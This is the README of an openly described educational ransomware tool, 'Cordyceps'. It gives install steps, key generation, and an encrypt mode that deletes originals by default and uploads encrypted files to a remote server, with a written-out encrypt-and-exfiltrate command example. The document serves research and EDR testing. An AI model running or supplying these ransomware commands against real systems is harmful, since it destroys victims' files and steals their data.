# Cordyceps

<img src="https://github.com/lopes/cordyceps/raw/main/assets/cordyceps-logo-192.png" align="left" alt="Cordyceps logo">

**Cordyceps** is an educational, Rust-based command-line **ransomware** ☣️ designed for academic and research purposes. It demonstrates the core mechanisms of file encryption, exfiltration, and decryption using modern cryptographic practices.

> [!CAUTION]
> This project is intended **strictly for educational use** in information security courses, penetration testing labs, or research environments. Unauthorized use of this tool—especially outside of controlled, lawful contexts—may be illegal and unethical. The author disclaims any responsibility for misuse or harm resulting from this software.


## What is Cordyceps?
Cordyceps simulates the behavior of a typical ransomware: it encrypts files on a target machine, exfiltrates them to a remote server, and allows for their recovery via decryption—assuming possession of the correct private key. It is designed for educational use in understanding ransomware internals and for testing endpoint detection and response (EDR) tools in controlled, ethical environments.

### Demo
[![asciicast](https://asciinema.org/a/8zdHiPgIrX6m05ahHkCPlRtyX.svg)](https://asciinema.org/a/8zdHiPgIrX6m05ahHkCPlRtyX)


## Purpose
Cordyceps was developed as a hands-on learning project to build practical skills in Rust—specifically around command-line interface design, networking, and data serialization—while experimenting with hybrid cryptographic schemes like ECIES (Elliptic Curve Integrated Encryption Scheme), and implementing public-key-based key management. Additionally, it serves as a tool for analyzing ransomware behavior and testing the detection capabilities of endpoint security solutions like EDRs in controlled environments.

It provides a practical platform for studying:
- **Ransomware Behavior Simulation**: Demonstrates the core logic of ransomware operations, from payload execution to encryption and optional file removal.
- **Key Management and Hybrid Cryptography**: Uses AES-GCM key for content encryption and ECIES (based on Curve25519) for secure key exchange with Perfect Forward Secrecy.
- **Data Exfiltration**: Recursively encrypts files from a specified directory and securely transmits them to a remote server over HTTP/HTTPS.
- **Data Recovery**: Decrypts `.zombie` files back to their original form using the appropriate private key.
- **Security Tool Evaluation**: Enables testing of EDRs and behavioral detection systems by providing realistic ransomware-like behavior in a safe, reproducible manner.

> [!CAUTION]
> Cordyceps is not intended for use against real-world systems without explicit legal authorization. It is designed for educational and research purposes only, within ethical and controlled settings.


## Key Features
- 🔄 **Dual Operation Modes**: Supports both `encrypt` and `decrypt` commands for flexible operation.
- 🔒 **Strong Cryptography**: Uses **AES-GCM** for file encryption and **ECIES (based on Curve25519)** for secure key exchange, providing Perfect Forward Secrecy.
- 🧟 **`.zombie` Format**: Each encrypted file is stored in a custom `.zombie` format containing:
  - Metadata
  - Ephemeral public key
  - Encrypted symmetric key
  - Nonces
  - Ciphertext
- 📁 **Recursive File Handling**: Automatically walks through directories, encrypts eligible files, and optionally deletes the original plaintext versions.
- 🌐 **Secure Network Exfiltration**: Transmits encrypted data over **HTTP** or **HTTPS** with support for target path specification and basic error handling.


## Ethical Use Notice
This project is a **technical demonstration**, not a weapon. Do not use Cordyceps outside of environments where you have full authorization and consent (e.g., your own machine, a test lab, or a sandbox). Misuse can carry severe legal consequences and violate ethical standards in cybersecurity. ☣️


## Installation
```sh
git clone https://github.com/lopes/cordyceps.git
cd cordyceps
cargo build --release
cp target/release/cordyceps $HOME/.local/bin/
```


## Usage
Cordyceps operates via command-line arguments, allowing flexible control over its behavior.

### Command Line Options
Cordyceps uses subcommands to handle different modes of operation. To use the tool, you must specify either the `encrypt` or `decrypt` command, each with its own set of options. If in doubt, run `cordyceps help`.

#### `generate` Command
Use the `generate` command to create a new Curve25519 key pair to start encrypting (public key) and decrypting (private key) files.

- `-p, --path <DIRECTORY>`: Specifies the path to store the key pair. Default: current directory (`.`). The keys will be saved as `main-private.key` and `main-public.key`.

#### `encrypt` Command
Use the `encrypt` command to begin the encryption and exfiltration process.

- `-p, --path <DIRECTORY>`: Specifies the starting directory for file processing. Default: current directory (`.`).
- `-k, --key <PATH>`: File path to the main public key. Default: `main-public.key`.
- `-n, --no-delete`: Prevents the original file from being deleted after successful encryption and transmission. Default: `false`, the original file is deleted.
- `-s, --server <ADDRESS>`: The **optional** URL of the server to exfiltrate data (e.g., `http://server:2673`). Default: none, exfiltration is disabled.

#### `decrypt` Command
Use the `decrypt` command to restore `.zombie` files using the provided private key.

- `-p, --path <DIRECTORY>`: Specifies the starting directory for file processing. Default: current directory (`.`).
- `-k, --key <PATH>`: File path to the main private key. Default: `main-private.key`.
- `-n, --no-delete`: Prevents the `.zombie` file from being deleted after successful decryption. Default: `false`, the `.zombie` file is deleted.

### Exfiltration
Exfiltration is an optional step for the encryption routine. The simplest way to implement it is to use Python's [uploadserver](https://pypi.org/project/uploadserver/). The easiest way of deploying it on the localhost is shown below:

```sh
python3 -m pip install --user uploadserver
python3 -m uploadserver 2673 --bind 127.0.0.1 --directory /tmp/cordyceps
```

After installing the uploadserver module on the localhost, run it binding it to port 2673 and to any directory. Then, you can test it with cURL to upload `./foobar.fb` file:

```sh
curl -X POST -F "files=@./foobar.fb" http://localhost:2673/upload
```

> [!NOTE]
> Since Cordyceps only exfiltrates encrypted files, using HTTP without TLS is perfectly fine.

If it worked, the exfiltration routine under [Cordyceps::net](src/net.rs) should work.🤞

### Examples
#### Encryption Example
This command will encrypt files in the `/path/to/sensitive_data` directory, send them to the specified server and folder, but will not delete the original files.

```sh
cordyceps encrypt -p /path/to/sensitive_data -k /path/to/main-public.key -s http://server:2673 -n
```

#### Decryption Example
This command will decrypt `.zombie` files in the `/path/to/zombie_files` directory using the private key located at `/path/to/your/main-private.key`.

```sh
cordyceps decrypt -p /path/to/zombie_files -k /path/to/your/main-private.key
```


## Key Management
- **Main Public Key**: For **encryption** operations, the main Curve25519 public key must be provided via the `--key` CLI option. This key is used to establish the shared secret for encrypting the AES key.
- **Main Private Key**: For **decryption** operations, the corresponding Curve25519 private key must be explicitly provided by the user via the `--key` CLI option. **It is paramount to keep this private key highly secure and never distribute it with the client application.**

Cordyceps is shipped with the `generate` command that creates a new key pair.


## Contributing
Contributions to Cordyceps are welcome! If you're interested in improving the project, here’s how to get started:

1. **Open an Issue**: Before diving into code, please [open an issue](https://github.com/lopes/cordyceps/issues) to discuss any bugs you’ve found or features you'd like to propose. This helps ensure alignment with the project’s goals and prevents duplicated work.
2. **Code Style**: Make sure your code adheres to Rust formatting standards (use `rustfmt`) and follows idiomatic Rust practices before submitting.
3. **Project Scope**: Cordyceps is a tool for file encryption, exfiltration, and decryption. Please keep contributions within this core focus—features outside this scope may be declined.
4. **Pull Requests**: Once your changes are ready, submit a [pull request](https://github.com/lopes/cordyceps/pulls) that includes:
  - A clear description of the changes
  - References to related issue(s)
  - Tests covering new functionality or bug fixes


## License
This project is licensed under the [MIT License](LICENSE).
